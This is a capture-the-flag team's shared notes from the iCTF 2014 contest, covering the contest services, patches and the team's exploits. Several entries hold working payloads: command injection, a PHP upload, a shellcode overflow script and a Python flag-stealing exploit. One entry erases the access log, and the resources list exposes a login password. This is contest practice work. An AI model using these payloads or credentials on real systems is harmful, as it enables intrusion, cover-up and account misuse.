@@ -1,0 +1,512 @@
+VUBar pad
+*0. Resources
+	1. our team id is 41 (vubar)
+	1. our VULN box is 10.7.41.2
+	1. https://www.ictf2014.com/#/  (login: vvdveen@cs.vu.nl | password: Peyknytkel2   )
+	1. once connected to our network (onsite network), you should have access on the root account on the VULN box, do not run intensive tasks there!
+	1. http://vpn_status.ictf2014.net/
+	1. admin interface: http://192.35.222.9:8000/
+	1. we can use this git repository for sharing source code amongst us: git@192.168.87.1:ctf (organize stuff on directories)
+	1. you should have already got an ip from 192.168.87.0/24 net, the router is 192.168.87.1, we also configured the DHCP server to push routes towards vuln box
+	1. the internal IRC channel for discussing this ctf is #vubar-ctf. You should also join #ictf2014-2015 (this is the public channel run by the organizers)
+	1. please read the rules from here (and also the mechanism of submitting exploits): http://ictf.cs.ucsb.edu/pages/rules.html
+	1. you can look around at any level challenge you want, when you have an idea it is better to wrote that you're working on a certain challenge on this pad such that you can teamup with others
+	1. Onsite: Louwesweg 1, Amsterdam, Hackerspace
+	1. have fun!
+
+
+What we are working on
+==============================
+
+tlevine did this
+
+	1. Look at Apache configuration files.
+	1. Exploit and patch the register service
+	1. Exploit (but not patch) the passwordverify service.
+
+The exploits are in the "exploits" directory in "git@192.168.87.1:ctf".
+
+Deathbaron is looking at yeesbutno
+
+Vulnerable Services
+===================
+
+https://www.ictf2014.com/#/services/info
+
+*acquire
+Listen 8184 / apache
+
+
+*aqs
+Erik 
+
+Listen 8014 / own http server
+
+
+*bassretard
+Command injection vulnerability:
+    GET /cgi-bin/netstat -> GET /cgi-bin/netstat; cat notes/<flag_id>
+Patching done with a LD_PRELOAD of system(), sanitizing the input.
+*
+
+*ccauthd
+32bit ELF
+Listen 12345
+
+*contribute
+Listen 8112 / apache
+us
+POST /cgi-bin/donate.py HTTP/1.1 
+Host: 10.7.41.2:8112 
+Accept-Encoding: identity 
+Content-Length: 131 
+
+cc=12345678901.php3&comment=%3C%3Fphp+print+implode%28%22%7C%22%2C+scandir%28%22.%22%29%29%3B+%3F%3E&amount=42&candidate=BlitzkriegHTTP/1.1 200 OK 
+Date: Fri, 10 Apr 2015 23:24:34 GMT 
+Server: Apache/2.4.7 (Ubuntu) 
+Transfer-Encoding: chunked 
+Content-Type: text/html 
+
+d9 
+
+<html>
+  <head>
+  </head>
+  <body bgcolor="#6699ff" textcolor=white>
+<b>Thank you very much for your donation!</b>
+<p>Click <a href="../reports/12345678901.php3">here</a> to review your donations.</p>
+</body></html>
+
+0
+
+
+*contributions
+Listen 8018 / apache
+
+*convicts
+empty dir?
+http://blog.frizn.fr/ictf-2011/service-convicts
+patched
+
+*curiosityblogging
+Listen 8089 / nodejs
+
+*diebald
+smurky - looking at this
+Listen 8012 / own py http server
+*
+*discussit
+Listen 8020 / apache
+
+
+*driller
+32bit ELF
+Listen 9091
+*
+*echo
+patched
+
+*guestbook
+Listen 8182 / apache
+	
+
+*mailgateway
+32bit ELF
+Listen 9119
+*
+*mathconsole
+unfinished
+http://antonio-bc.blogspot.it/2013/12/mathconsole-ictf-2013-writeup.html # The first vulnerability described here seems to be fixed.
+Byte at 0x281 needs to be patched to 0x5a. Decompiled python script is in git repo.
+Listen 9899
+*
+*msgdispatcher
+cojocar
+port: 31337
+python script (uncompyle2)
+http://blog.frizn.fr/ictf-2011/service-msgdispatcher
+
+*
+*mulemanager
+Listen 7899 / apache
+
+
+*museum
+Listen 8001 / apache
+having a look...
+Andrei
+first input in search:
+$(ls /var/ctf/museum/museum_ideas | grep FLAG_ID > /var/ctf/museum/museum_spam/special-output.txt)
+$(ls /var/ctf/museum/museum_ideas | grep AXVCdHq > /var/ctf/museum/museum_spam/special-output.txt)
+
+second input in search:
+FLAG_ID
+
+now you will get the filename: AXVCdHq.CKQFrC
+
+now a request to museum_admin.pl
+first: FLAG_ID
+second: second part of above filename
+password unbreakable
+
+now you'll have the flag: FLGWcoVusaKhZD6T
+
+clean up:
+    another request to search:
+        $(rm /var/ctf/museum/access.log && touch /var/ctf/museum/access.log)
+
+*music-copyright
+Listen 8015 / apache
+
+
+*noradioactive
+Exploit in program logic when registering new users.
+Patch by switching two lines and recompiling
+
+*
+*nuclearboom2
+32bit ELF
+Listen 4444
+Erik
+
+*passwordverify
+Listen 8183 / apache
+32bit ELF
+Listen 11111 / service
+
+# service passwordverify start
+
+If exploits kill it, then we edit /etc/init.d/passwordverify
+
+[tlevine@calque sites-enabled]$ echo 'STORE a b' | nc 10.7.41.2 11111
+Word "b" included in user dictionary
+[tlevine@calque sites-enabled]$ echo 'DICT a' | nc 10.7.41.2 11111
+b
+b
+b
+b
+b
+[tlevine@calque sites-enabled]$ echo 'CHECK a b' | nc 10.7.41.2 11111
+This password sucks!
+[tlevine@calque sites-enabled]$ echo 'CHECK oa b' | nc 10.7.41.2 11111
+ERROR: cannot find user's dict file
+[tlevine@calque sites-enabled]$ echo 'CHECK not-a-user b' | nc 10.7.41.2 11111
+ERROR: cannot find user's dict file
+
+
+          Users can connent to the service using a simple telnet          application. By using the STORE [username]          [word] command users can update their personal          dictionary. The personal dictionary can be viewed at any          time using the DICT [username] command. A          password can be checked for strength using the CHECK          [username] [password] command.        
+
+This is the exploit
+
+	$ echo 'DICT BxqujYEg-mkRteXQ' | nc 10.7.41.2 11111
+	ERROR: cannot read from user dict file
+	[tlevine@calque sites-enabled]$ echo 'DICT BxqujYEg-mkRtXQ' | nc 10.7.41.2 11111
+	bdcjXN
+
+(Return False on ERROR and True otherwise.)
+
+To secure ourselves, create the file
+/var/ctf/passwordverify/passwordverify-userdict/$username
+before running passwordverify for every particular username. Or something like that.
+Passwordverify is a binary.
+
+*petition
+Listen 8017 / apache
+Andrei having a look
+solved / deployed
+*
+*poipoi
+32bit ELF
+Listen 3335
+*
+*powerplan
+Listen 9898
+*
+*register
+tlevine has patched this by disabling "debug" and has written an exploit.
+
+* I thought it was vulnerable to SQL injection, but I'm not sure now.
+* 404 on vote.css
+* Form uses GET method (instead of POST), so caching and other stuff could be funny.
+* Passwords are stored in plain text.
+
+# mysql -uclerk -pelections registration
+
+mysql> select * from voters;
++----+------------+---------------+------------------+-----------------------------+----------+----------------------------------+
+| id | last       | first         | dob              | email                       | password | wwid                             |
++----+------------+---------------+------------------+-----------------------------+----------+----------------------------------+
+|  1 | Fellini    | Federico      | Jan 20, 1920     | fellini@amarcord.it         | volpina  | 73bb828929783a987d287e4c8==      |
+|  2 | Fassbinder | Rainer Werner | 31 May 1945      | fassbinder@petravonkant.com | strasse  | 83774629992a38d98ee3f79873==     |
+|  3 | Bergh      | Johnny        | 22 August 1968   | bergh@homeofgiants.com      | norway   | 878e87a87d80f562a732876221==     |
+|  4 | Lang       | Fritz         | 5 December 1890  | fritz@metropolis.com        | austria  | 827896872a098d098a57abb9891==    |
+|  5 | Spielberg  | Steven        | 18 December 1946 | steven@spielberg.com        | jaws     | 739879a987b9874cc667f6dea27287== |
+|  6 | t          | tn            | n                | t                           | t        | n                                |
++----+------------+---------------+------------------+-----------------------------+----------+----------------------------------+
+
+
+*reportd
+32bit ELF
+Listen 6666
+*
+*securenotebook
+64bit ELF
+*
+*sendalert
+Listen 31337
+*
+*sillybox
+
+looking at it.... 
+sillybox: ELF 32-bit LSB  shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3a36c099191d97f9a7263c25ffaf2707128ead3c, stripped
+
+giving up, but this one seems to be simple as we're losing flags with it
+
+*
+*simpleftp
+Andrei
+Listen 2025
+
+
+*smsgateway
+cojocar
+port: 1991
+*import sys, hax
+* 
+*def le(addr):
+*    return ''.join( chr( (addr>>i)&0xff ) for i in range(0,32,8) )
+* 
+*def be(addr):
+*    return ''.join( chr( (addr>>i)&0xff ) for i in range(24,-8,-8) )
+* 
+*def write_string(s):
+*    return be(len(s))+s
+* 
+*def message(time,sender,subject,body, diff):
+*    return write_string(
+*        write_string(time)+
+*        write_string(sender)+
+*        write_string(subject)+
+*        write_string(body)+be(1)+be(diff))
+* 
+*memcpy_plt=0x804c058
+*array_base=0x805c308
+*diff = memcpy_plt - array_base
+* 
+*shellcode = "6a045b89d9496a3f58cd8075f89950686e2f7368682f2f626989e3b00bcd80".decode('hex')
+* 
+*print message("","VU-bar", "", shellcode+(le(0x804f100)*8256), diff)
+http://blog.frizn.fr/ictf-2011/service-smsgw
+done
+
+*spamagent
+cojocar
+Listen 8185
+<VirtualHost *:8185>
+done
+
+POST /cgi-bin/spamagent HTTP/1.0 
+content-type: multipart/form-data; boundary=----------ThIs_Is_tHe_bouNdaRY_$ 
+content-length: 263 
+
+------------ThIs_Is_tHe_bouNdaRY_$ 
+Content-Disposition: form-data; name="script" 
+
+<agent><sender><user>mtMueWo</user><password>j6rE4uMc</password></sender><code>set flag [store get flag]; results set $flag</code></agent> 
+------------ThIs_Is_tHe_bouNdaRY_$-- 
+HTTP/1.1 200 OK 
+Date: Fri, 10 Apr 2015 23:19:07 GMT 
+Server: Apache/2.4.7 (Ubuntu) 
+Content-Length: 16 
+Connection: close 
+Content-Type: text/plain 
+
+FLGtitMDRdEiITjW
+
+
+*
+*spammer
+Listen 8123
+
+
+*stockjobber
+*
+*talkun
+64-bit ELF
+Directory contains certificate + RSA private key and a piece of text
+*
+*tattletale
+cojocar
+http://andrewdutcher.com/view/15/ictf-2013---tattletale-writeup
+Seems to still be the same challenge. Tested up to having transfered all files to Agent0, then stuff crashed on my laptop.
+
+*temperature
+
+EXPLOIT DEPLOYED. PATCH ENABLED BUT NOT SURE IF GOOD ENOUGH.
+
+builcommand: 
+    cat neverguess | grep %s | grep %s | awk '{print $3}'
+    
+    command = build_command()%(date,location)
+    with os.popen(command) as f:
+      response = f.read()
+      clientsock.send(response)
+
+    
+buildcommand2: 
+    echo " %s %s %s " >> neverguess
+
+    command = build_command2()%(date,location,temperature)
+    os.system(command)
+
+
+$ nc -vvv localhost 56098
+What would you like to do?:
+1 - Lookup a temperature
+2 - Add a temperature recording
+: 1
+Insert a date to lookup (YYYY/MM/DD): 
+Insert a location: ; ls -al; xx
+total 68
+drwxrwxr-x  2 vvdveen vvdveen  4096 Apr 10 17:41 .
+drwxrwxr-x 87 vvdveen vvdveen 36864 Apr 10 17:39 ..
+-rw-rw-r--  1 vvdveen vvdveen    52 Apr 10 17:41 neverguess
+-rwxr-x---  1 vvdveen vvdveen  2509 Apr 10 17:41 temperature
+
+
+exploit.py:
+    
+#!/usr/bin/python 
+
+HOST = '10.7.41.2'
+PORT = 56098
+
+import socket
+
+class Exploit():
+    def execute(self, ip, port, flag_id): 
+        s = socket.socket()
+        s.connect((ip, port))
+
+        data = s.recv(1024)
+        #print data
+
+        s.send('1\n')
+        data = s.recv(1024)
+        #print data
+
+        #s.send('xx\n')
+        s.send('1\n')
+        data = s.recv(1024)
+        #print data
+
+        s.send("; cat /var/ctf/temperature/neverguess | grep %s; xx\n" % flag_id)
+        data = s.recv(1024)
+        flag = data.split(' ')[3]
+
+        self.flag = flag
+
+
+    def result(self):
+        return {'FLAG' : self.flag}
+
+
+
+x = Exploit()
+x.execute(HOST, PORT, '1996/09/30')
+print x.result()
+
+
+
+*
+*traintrain
+cojocar
+8888
+http://www.blue-lotus.net/ictf-2013-traintrain-writeup/
+*
+*water
+listening on 3333
+The script in the below blog is not exactly similar though.
+https://isisblogs.poly.edu/2013/04/11/ucsb-ictf-2013-water-write-up/
+*
+169175,166712,15767,154728,297748,21421,331255,422791,529567,643356,75770,862226,923476
+
+Welcome back. Please insert your measurement
+:Floods ahead! Please enter your command
+:
+
+YwEAAAACAAAABgAAAEMAAABzQgAAAGQBAGQAAGwAAH0BAHwAAGoBAGQCAHQCAHwBAGoDAGQDAGQEABdkBQAXgwEAagQAgwAAgwEAF2QGABeDAQABZAAAUygHAAAATmn/////cwUAAAAhYXNkIXNAAAAAZWNobyAnc2VsZWN0IGFkZHJlc3MgZnJvbSBtdWxlbWFuYWdlci5lbmRwb2ludHMgd2hlcmUgdXNlcm5hbWU9InMLAAAAZ3V3ZG9nZGZjZXJzLwAAACInIHwgbXlzcWwgLXUgbXVsZW1hbmFnZXIgLXBncmFidGhpc3doaWxleW91Y2FucwYAAAAhYXNkIQooBQAAAHQCAAAAb3N0BwAAAHNlbmRhbGx0AwAAAHN0cnQFAAAAcG9wZW50BAAAAHJlYWQoAgAAAHQEAAAAc2VsZlIAAAAAKAAAAAAoAAAAAHNBAAAAL3Zhci9jdGYvc2NyaXB0cy80MS8yMDI0LzZlMGRmZTI4MjI1ZGIwOTMwYjg3MjZiZjgxNTUzZWZkLzIwMjQucHl0CAAAAGNhbGxiYWNrDwAAAHMEAAAAAAEMAQ==
+
+!asd!address
+FLG0yrxhTgl6lkU8
+!asd!
+
+
+*webasstard
+*
+*yeesbutno
+64bit ELF
+Listen 3336
+patch:
+entry_screen is a backdoor for anyone's secret, skip the if:
+0x0000000000401385: je 0x40143f       -> jmpq 0x40143f 
+0x0000000000401385: 0f 84 b4 20 20 20 -> e9 b5 20 20 20 90 
+Deathbaro working on the exploit part
+*
+
+Apache sites
+======================
+
+$ head -n2 sites-enabled/*.conf 
+==> sites-enabled/acquire.conf <==
+Listen 8184
+<VirtualHost *:8184>
+
+==> sites-enabled/contribute.conf <==
+Listen 8112
+<VirtualHost *:8112>
+
+==> sites-enabled/contributions.conf <==
+Listen 8018
+<VirtualHost *:8018>
+
+==> sites-enabled/discussit.conf <==
+Alias /discussit/ /usr/ctf/discussit/html/
+Listen 8020
+
+==> sites-enabled/guestbook.conf <==
+Listen 8182
+<VirtualHost *:8182>
+
+==> sites-enabled/mulemanager.conf <==
+Listen 7899
+<VirtualHost *:7899>
+
+==> sites-enabled/museum.conf <==
+Listen 8001
+<VirtualHost *:8001>
+
+==> sites-enabled/music-copyright.conf <==
+Listen 8015
+<VirtualHost *:8015>
+
+==> sites-enabled/passwordverify.conf <==
+Listen 8183
+<VirtualHost *:8183>
+
+==> sites-enabled/petition.conf <==
+Listen 8017
+<VirtualHost *:8017>
+
+==> sites-enabled/register.conf <==
+Listen 6789
+<VirtualHost *:6789>
+
+==> sites-enabled/spamagent.conf <==
+Listen 8185
+<VirtualHost *:8185>
+
+==> sites-enabled/spammer.conf <==
+Listen 8123
+<VirtualHost *:8123>
+
